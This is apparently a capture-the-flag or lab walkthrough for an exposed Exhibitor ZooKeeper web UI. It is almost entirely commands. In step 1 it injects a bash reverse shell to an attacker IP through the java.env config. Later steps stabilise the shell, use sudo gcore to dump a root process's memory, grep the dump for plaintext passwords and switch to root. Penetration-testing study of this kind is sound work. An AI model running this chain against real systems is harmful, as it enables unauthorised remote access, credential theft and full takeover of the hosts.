# Exhibitor ZooKeeper — RCE to Root via gcore

**Trigger:** Exhibitor web UI exposed with no auth + `sudo gcore` available to low-priv user

---

## Step 1 — RCE via java.env Script Injection

1. Browse to Exhibitor UI (port 8080 or 8081)
2. Go to **Config** tab
3. Replace `java.env script` with:

```bash
export JAVA_OPTS="-Xms1000m -Xmx1000m"
/bin/bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

4. Click **Commit...**
5. Go to **Control Panel** → click **Restart...**
6. Shell catches on `nc -lvnp <PORT>`

---

## Step 2 — Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 3 — Check Sudo

```bash
sudo -l
# Expected: (ALL) NOPASSWD: /usr/bin/gcore
```

---

## Step 4 — Find Target Process

```bash
ps aux | grep root
```
→ Look for a root process holding credentials (e.g., `password-store`, a secrets manager, or similar).

---

## Step 5 — Dump Process Memory

```bash
cd /tmp
sudo gcore <PID>
strings core.<PID> | grep -i password
strings core.<PID>
```
→ Extract plaintext password from the dump.

---

## Step 6 — Switch to Root

```bash
su root
# enter the password found in the dump
```

---

## Flags

```bash
cat /home/<user>/local.txt    # user flag
cat /root/proof.txt           # root flag
```
